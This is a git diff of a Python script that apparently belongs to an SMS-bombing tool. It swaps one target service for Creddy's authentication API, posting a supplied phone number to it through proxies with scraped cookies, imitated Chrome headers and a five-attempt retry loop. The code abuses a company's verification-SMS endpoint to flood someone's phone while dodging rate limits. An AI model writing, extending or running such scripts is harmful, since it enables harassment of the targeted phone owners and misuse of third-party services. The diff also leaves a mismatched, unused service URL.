@@ -1,18 +1,34 @@
 import requests
 from config import Proxy, Services
-import json
+from utils.response_utils import get_cookies_and_headers
 
+def send_sms_to_creddy(phone_number: str):
 
-def send_sms_to_4lapy(phone_number: str):
-    url = Services.FOUR_LAPY
+    url = Services.STREET_BEAT
+    cookie = get_cookies_and_headers('https://creddy.ru/').get('Cookie')
     headers = {
-        "Content-Type": "application/x-www-form-urlencoded",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+        "accept": "application/json, text/plain, */*",
+        "accept-encoding": "gzip, deflate, br, zstd",
+        "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
+        "content-type": "application/json",
+        "Cookie": cookie,
+        "origin": "https://client.creddy.ru",
+        "priority": "u=1, i",
+        "referer": "https://client.creddy.ru/",
+        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-site",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
     }
 
     data = {
-        "phone": phone_number[1:]
+        "phone_number": phone_number[1::1]
     }
+
+    session = requests.session()
 
     proxies = {
         "http": Proxy.PROXY_URL,
@@ -21,13 +37,10 @@ def send_sms_to_4lapy(phone_number: str):
 
     max_attempts = 5
     attempt = 0
-
     while attempt < max_attempts:
         try:
-            response = requests.post(url, headers=headers, data=data, proxies=proxies)
-            print("YSAM: ", response, response.text)
-            with open('ysam.log', "w") as file:
-                file.write(f"Статус код: {str(response.status_code)}\nОтвет: {response.text}")
+            response = session.post(f'https://api-auth.creddy.ru/api/v1/user',json=data, headers=headers, proxies=proxies)
+            print("creddy: ", response, response.text)
             response.raise_for_status()
 
             try:
